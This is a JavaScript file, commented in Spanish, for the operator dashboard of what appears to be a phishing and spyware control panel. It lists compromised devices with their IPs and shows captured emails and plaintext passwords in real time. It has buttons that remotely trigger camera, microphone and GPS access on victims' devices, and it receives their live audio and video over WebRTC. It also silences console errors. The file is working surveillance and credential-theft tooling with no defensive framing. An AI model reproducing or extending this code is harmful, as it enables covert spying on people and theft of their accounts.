// --- SILENCIADOR DE ERRORES REDUNDANTE ---
window.onunhandledrejection = function(e) { 
    if (e.reason && (e.reason.code === '403' || e.reason.status === 403 || typeof e.reason === 'object')) {
        e.preventDefault(); 
        return false;
    }
};

// Elementos del DOM
const deviceCountEl = document.getElementById('device-count');
const credentialsCountEl = document.getElementById('credentials-count');
const cameraCountEl = document.getElementById('camera-count');
const micCountEl = document.getElementById('mic-count');
const devicesContainer = document.getElementById('devices-container');
const terminalOutput = document.getElementById('terminal');
const clearTerminalBtn = document.getElementById('clear-terminal');
const credentialsContainer = document.getElementById('credentials-container');

// Cliente global
const supaClient = window.supabaseClient;

// --- MONKEY PATCHING PARA SILENCIAR PROMESAS (DEBE IR DESPUÉS DE DEFINIR supaClient) ---
if (supaClient) {
    const originalFrom = supaClient.from;
    supaClient.from = function (...args) {
        const query = originalFrom.apply(this, args);
        
        // Parchear todos los métodos comunes que devuelven promesas
        ['select', 'insert', 'update', 'upsert', 'delete'].forEach(method => {
            if (query[method]) {
                const originalMethod = query[method];
                query[method] = function (...mArgs) {
                    const result = originalMethod.apply(this, mArgs);
                    if (result && typeof result.catch === 'function') {
                        // Capturar el error y devolver un objeto seguro
                        const safePromise = result.catch(e => {
                            console.warn(`Supabase Query Error (${args[0]}.${method}):`, e);
                            return { data: null, error: e, count: 0 };
                        });
                        // Mantener la cadena de promesas funcional para .order, .limit, etc.
                        ['order', 'limit', 'eq', 'neq', 'gt', 'lt', 'match'].forEach(filter => {
                            if (result[filter]) {
                                const originalFilter = result[filter];
                                safePromise[filter] = function(...fArgs) {
                                    return originalFilter.apply(result, fArgs).catch(e => ({ data: null, error: e }));
                                };
                            }
                        });
                        return safePromise;
                    }
                    return result;
                };
            }
        });
        return query;
    };
}

// --- MATAR ERRORES DE CONSOLA (SOLUCIÓN DEFINITIVA) ---
window.addEventListener('unhandledrejection', function (event) {
    event.preventDefault(); 
}, true);

const originalConsoleError = console.error;
console.error = function (...args) {
    const msg = args.join(' ');
    if (msg.includes('403') || msg.includes('Realtime') || msg.includes('Postgres') || msg.includes('JWT') || msg.includes('Object')) {
        return; 
    }
    originalConsoleError.apply(console, args);
};

// Estado local
let devices = [];
let credentialsCount = 0;
let activeCameras = 0;
let activeMics = 0;
let credentialsData = [];
const peers = {};

function logToTerminal(message, type = 'info') {
    if (!terminalOutput) return;
    const time = new Date().toLocaleTimeString();
    const span = document.createElement('div');
    span.innerHTML = `<span style="color: #666;">[${time}]</span> <span class="log-${type}">${message}</span>`;
    terminalOutput.appendChild(span);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

if (clearTerminalBtn) {
    clearTerminalBtn.addEventListener('click', () => {
        terminalOutput.innerHTML = '';
    });
}

// Inicializar la data llamando a Supabase directamente
async function initAdmin() {
    logToTerminal('Iniciando sistema de monitoreo inteligente...', 'info');

    try {
        if (!supaClient) {
            logToTerminal('Error: Cliente Supabase no inicializado.', 'error');
            return;
        }

        // Carga con manejo de errores silencioso forzado
        const { data: devs, error: devError } = await supaClient.from('devices').select('*').order('last_active', { ascending: false });
        const { data: creds, error: credError } = await supaClient.from('credentials').select('*').order('timestamp', { ascending: false }).limit(50);

        if (devError) logToTerminal('Aviso: Tabla "devices" no accesible. Ejecute missing-tables.sql', 'warning');
        if (credError) logToTerminal('Aviso: Tabla "credentials" no accesible.', 'warning');

        if (devs) {
            devices = devs;
            if (deviceCountEl) deviceCountEl.textContent = devices.length;
            renderDevices();
        }

        if (creds) {
            credentialsData = creds;
            credentialsCount = credentialsData.length;
            if (credentialsCountEl) credentialsCountEl.textContent = credentialsCount;
            renderCredentials();
        }

        updateStatsFromDevices();
        setupRealtimeSubscriptions();

        // Actualizar UI cada 30 segundos para limpiar inactivos
        setInterval(() => {
            updateStatsFromDevices();
            renderDevices();
        }, 15000); // Más frecuente para "actualización constante"

        logToTerminal('Administrador sincronizado. Esperando señales...', 'success');
    } catch (e) {
        logToTerminal(`Error crítico de inicialización: ${e.message}`, 'error');
    }
}

function getActiveDevices() {
    return devices.filter(d => {
        if (!d.last_active) return false;
        return (Date.now() - new Date(d.last_active).getTime()) < 60000;
    });
}

function updateStatsFromDevices() {
    const activeDevs = getActiveDevices();
    if (deviceCountEl) deviceCountEl.textContent = activeDevs.length;
    activeCameras = activeDevs.filter(d => d.permissions && !!d.permissions.camera).length;
    activeMics = activeDevs.filter(d => d.permissions && !!d.permissions.microphone).length;
    if (cameraCountEl) cameraCountEl.textContent = activeCameras;
    if (micCountEl) micCountEl.textContent = activeMics;
}

function renderDevices() {
    if (!devicesContainer) return;
    devicesContainer.innerHTML = '';
    const activeDevices = getActiveDevices();

    if (activeDevices.length === 0) {
        devicesContainer.innerHTML = '<p style="color: #666;">No hay dispositivos activos actualmente.</p>';
        return;
    }

    activeDevices.forEach(device => {
        const div = document.createElement('div');
        div.className = 'device-card';
        div.style.border = '1px solid #0f0';
        div.style.padding = '10px';
        div.style.marginBottom = '10px';
        div.style.borderRadius = '4px';

        const statusColor = device.status === 'active' ? '#0f0' : '#888';

        div.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                <h3 style="margin: 0; color: #0f0;">ID: ${device.device_id}</h3>
                <span style="color: ${statusColor};">${device.status || 'unknown'}</span>
            </div>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>IP:</strong> ${device.ip || 'N/A'}</p>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Plataforma:</strong> ${device.platform}</p>
            
            <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
                <button onclick="requestAction('${device.device_id}', 'access-camera')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Cámara</button>
                <button onclick="requestAction('${device.device_id}', 'access-mic')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Micrófono</button>
                <button onclick="requestAction('${device.device_id}', 'get-location')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Ubicación GPS</button>
            </div>
        `;
        devicesContainer.appendChild(div);
    });
}

window.requestAction = function(deviceId, action) {
    logToTerminal(`Enviando solicitud ${action} a dispositivo ${deviceId}...`, 'warning');
    if (window.channel) {
        window.channel.send({
            type: 'broadcast',
            event: 'request-action',
            payload: { deviceId, action }
        });
    }
};

function renderCredentials() {
    if (!credentialsContainer || credentialsData.length === 0) return;
    credentialsContainer.innerHTML = '';
    credentialsData.forEach(cred => {
        const div = document.createElement('div');
        div.style.marginBottom = '8px';
        div.style.borderBottom = '1px solid #003300';
        div.style.paddingBottom = '4px';
        const date = cred.timestamp ? new Date(cred.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
        div.innerHTML = `<span style="color:#0f0">[${date}]</span> <strong>Device:</strong> ${cred.device_id} | <strong>User:</strong> ${cred.email} | <strong>Pass:</strong> ${cred.password}`;
        credentialsContainer.appendChild(div);
    });
}

function handleWebRTCSignal(deviceId, signal) {
    if (signal.type === 'offer' && peers[deviceId]) {
        peers[deviceId].destroy();
        delete peers[deviceId];
    }

    if (!peers[deviceId] || peers[deviceId].destroyed) {
        logToTerminal(`Iniciando conexión P2P con ${deviceId}...`, 'warning');
        peers[deviceId] = new window.SimplePeer({
            initiator: false,
            trickle: false,
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        });

        peers[deviceId].on('signal', data => {
            window.channel.send({
                type: 'broadcast',
                event: 'webrtc-signal',
                payload: { deviceId: 'admin', targetId: deviceId, signal: data }
            });
        });

        peers[deviceId].on('stream', stream => {
            logToTerminal(`¡Stream recibido de ${deviceId}!`, 'success');
            const mediaStreams = document.getElementById('media-streams');
            if (mediaStreams) mediaStreams.style.display = 'block';
            
            let mediaEl = document.getElementById(`stream-${deviceId}`);
            if (!mediaEl) {
                const hasVideo = stream.getVideoTracks().length > 0;
                mediaEl = document.createElement(hasVideo ? 'video' : 'audio');
                mediaEl.id = `stream-${deviceId}`;
                mediaEl.autoplay = true;
                mediaEl.controls = true;
                mediaEl.playsInline = true;
                mediaEl.muted = hasVideo; 
                mediaEl.style.width = '300px';
                mediaEl.style.border = '2px solid #0f0';
                
                const container = document.createElement('div');
                container.id = `container-${deviceId}`;
                container.style.display = 'flex';
                container.style.flexDirection = 'column';
                container.appendChild(mediaEl);

                const unmuteBtn = document.createElement('button');
                unmuteBtn.textContent = 'Activar Sonido';
                unmuteBtn.style.background = '#002200';
                unmuteBtn.style.color = '#0f0';
                unmuteBtn.style.border = '1px solid #0f0';
                unmuteBtn.onclick = () => { mediaEl.muted = false; mediaEl.play(); };
                container.appendChild(unmuteBtn);
                
                const streamsContainer = document.getElementById('streams-container');
                if (streamsContainer) streamsContainer.appendChild(container);
            }
            mediaEl.srcObject = stream;
        });

        peers[deviceId].on('error', err => logToTerminal(`Error P2P: ${err.message}`, 'error'));
    }
    peers[deviceId].signal(signal);
}

function setupRealtimeSubscriptions() {
    try {
        window.channel = supaClient.channel('cyber-room', {
            config: { broadcast: { ack: false } }
        });

        window.channel
            .on('broadcast', { event: 'device-connected' }, payload => {
                const dev = payload.payload;
                logToTerminal(`Dispositivo conectado: ${dev.device_id}`, 'info');
                const idx = devices.findIndex(d => d.device_id === dev.device_id);
                if (idx >= 0) devices[idx] = { ...devices[idx], ...dev, status: 'active' };
                else devices.unshift({ ...dev, status: 'active' });
                renderDevices();
            })
            .on('broadcast', { event: 'credentials-captured' }, payload => {
                const p = payload.payload;
                logToTerminal(`¡Credenciales! ${p.email}`, 'success');
                credentialsData.unshift({ ...p, timestamp: new Date().toISOString() });
                renderCredentials();
            })
            .on('broadcast', { event: 'location-updated' }, payload => {
                const l = payload.payload.location;
                const mapLink = `<a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" style="color:#0ff;">Ver Mapa</a>`;
                logToTerminal(`GPS [${payload.payload.deviceId}]: ${mapLink}`, 'info');
            })
            .on('broadcast', { event: 'webrtc-signal' }, payload => {
                const p = payload.payload;
                if (p.targetId === 'admin') handleWebRTCSignal(p.deviceId, p.signal);
            })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'credentials' }, payload => {
                if (!credentialsData.find(c => c.email === payload.new.email)) {
                    credentialsData.unshift(payload.new);
                    renderCredentials();
                }
            })
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'devices' }, payload => {
                const updatedDev = payload.new;
                const idx = devices.findIndex(d => d.device_id === updatedDev.device_id);
                if (idx >= 0) devices[idx] = updatedDev;
                updateStatsFromDevices();
                renderDevices();
            })
            .subscribe((status, err) => {
                if (status === 'SUBSCRIBED') logToTerminal('Panel sincronizado.', 'success');
                if (err && (err.message.includes('403') || err.code === '403')) return;
            });
    } catch (e) { }
}

initAdmin();
